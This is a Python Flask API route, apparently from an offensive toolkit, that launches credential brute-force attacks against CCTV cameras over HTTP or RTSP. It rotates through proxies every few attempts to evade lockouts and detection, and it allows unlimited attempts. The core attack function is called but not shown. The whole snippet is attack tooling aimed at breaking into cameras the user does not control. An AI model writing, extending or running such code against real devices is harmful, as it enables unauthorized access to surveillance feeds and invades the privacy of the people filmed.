@app.route("/api/autonomous/cctv-proxy-bruteforce", methods=["POST"])
def autonomous_cctv_proxy_bruteforce_route():
    """Execute credential brute-force with automatic proxy rotation every N attempts.
    Supports HTTP and RTSP protocols."""
    try:
        data = request.get_json(silent=True) or {}
        target = data.get("target", "")
        if not target:
            return jsonify({"error": "Missing 'target' parameter"}), 400
        protocol = data.get("protocol", "http").lower()
        if protocol not in ("http", "rtsp"):
            return jsonify({"error": "Invalid 'protocol'. Must be 'http' or 'rtsp'"}), 400
        port = _sanitize_port(data.get("port", 80), default=80)
        manufacturer = _sanitize_manufacturer(data.get("manufacturer", "generic"))
        credentials = data.get("credentials", None)
        proxies = data.get("proxies", None)
        attempts_before_rotate = min(max(int(data.get("attempts_before_rotate", 4)), 1), 100)
        max_attempts = max(int(data.get("max_attempts", 0)), 0)  # 0 = unlimited
        rtsp_port = _sanitize_port(data.get("rtsp_port", 554), default=554)
        rtsp_path = data.get("rtsp_path", None)
        proxy_file = data.get("proxy_file", None)
        logger.info(f"[CCTV] Proxy-rotation brute-force for {target} (protocol={protocol}, rotate every {attempts_before_rotate})")
        result = _multi_target_cctv(
            target, autonomous_cctv_proxy_bruteforce.proxy_brute_force,
            port, manufacturer, credentials, proxies,
            attempts_before_rotate, max_attempts,
            protocol, rtsp_port, rtsp_path, proxy_file,
        )
        return jsonify(result)
    except Exception as e:
        logger.error(f"CCTV proxy brute-force error: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500


